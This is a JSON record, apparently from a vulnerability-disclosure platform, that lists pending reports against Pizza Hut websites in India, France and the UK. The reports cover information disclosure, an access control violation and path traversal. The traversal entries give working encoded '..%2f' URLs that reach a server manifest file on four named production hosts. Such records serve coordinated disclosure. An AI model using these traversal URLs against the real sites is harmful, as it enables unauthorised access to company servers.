{
  "listing_id": "ldrjlsvq6j",
  "type": "categories",
  "value": [
    {
      "categories": [
        "Information Disclosure",
        "Sensitive Client Information Disclosed"
      ],
      "exploitable_locations": [
        {
          "type": "url",
          "value": "https://restaurants.pizzahut.co.in/",
          "created_at": 1630171190,
          "status": "pending"
        }
      ]
    },
    {
      "categories": [
        "Authorization/Permissions",
        "Access/Privacy Control Violation"
      ],
      "exploitable_locations": [
        {
          "type": "url",
          "value": "https://restaurants.pizzahut.co.in/",
          "created_at": 1585845864,
          "status": "pending"
        }
      ]
    },
    {
      "categories": [
        "Authorization/Permissions",
        "Path Traversal"
      ],
      "exploitable_locations": [
        {
          "type": "url",
          "value": "https://pizzahut.co.in/_next/static/..%2fserver/pages-manifest.json/",
          "created_at": 1585904463,
          "status": "pending"
        },
        {
          "type": "url",
          "value": "https://www.pizzahut.fr/_next/static/..%2fserver/pages-manifest.json/",
          "created_at": 1585904463,
          "status": "pending"
        },
        {
          "type": "url",
          "value": "https://www.pizzahut.co.uk/_next/static/..%2fserver/pages-manifest.json/",
          "created_at": 1585904463,
          "status": "pending"
        },
        {
          "type": "url",
          "value": "https://online.pizzahut.co.in/_next/static/..%2fserver/pages-manifest.json/",
          "created_at": 1585904463,
          "status": "pending"
        }
      ]
    }
  ]
}